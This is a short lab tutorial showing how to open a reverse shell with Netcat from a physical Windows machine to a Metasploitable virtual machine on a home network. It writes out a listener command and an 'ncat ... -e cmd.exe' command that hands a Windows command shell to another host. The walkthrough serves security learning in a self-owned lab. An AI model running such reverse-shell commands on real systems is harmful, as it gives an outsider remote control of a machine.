We demonstrate how to open a remote shell through `Netcat`, allowing us to navigate the directories of a physical machine using Metasploitable.

To open a reverse shell, we need the IP address of Metasploitable, from which we open the remote shell:

<img src="1.png" width="650">

The address is `192.168.1.227`.

Now we open a listener on port `5555` of the virtual machine using the command `nc -nlvp 5555`:

<img src="2.png" width="650">

From the physical machine, we run the command `ncat 192.168.1.227 5555 -e cmd.exe` to open a remote shell to Metasploitable's address:

<img src="3.png" width="650">

From Metasploitable, we can see that the connection was successful:

<img src="4.png" width="650">

Now we can navigate the directories of the physical machine from Metasploitable's shell using the `dir` command:

<img src="5.png" width="650">